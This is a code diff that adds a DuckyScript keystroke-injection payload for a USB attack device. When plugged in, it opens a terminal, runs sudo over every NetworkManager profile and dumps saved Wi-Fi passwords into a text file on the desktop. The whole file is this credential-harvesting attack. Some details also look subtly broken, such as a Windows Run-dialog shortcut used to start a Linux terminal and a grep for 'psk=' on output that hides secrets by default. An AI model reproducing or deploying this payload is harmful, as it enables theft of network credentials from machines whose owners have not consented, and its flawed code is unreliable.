@@ -1,0 +1,25 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 1000
+
+STRING sudo bash -c 'for profile in $(nmcli -t -f name connection show); do
+ENTER
+DELAY 500
+STRING echo "Profile: $profile" >> ~/Desktop/WiFiPasswords.txt
+ENTER
+DELAY 250
+STRING sudo nmcli connection show "$profile" | grep -i "psk=" >> ~/Desktop/WiFiPasswords.txt
+ENTER
+DELAY 250
+STRING echo "" >> ~/Desktop/WiFiPasswords.txt
+ENTER
+DELAY 500
+STRING done'
+ENTER
+
+DELAY 500
+STRING exit
+ENTER
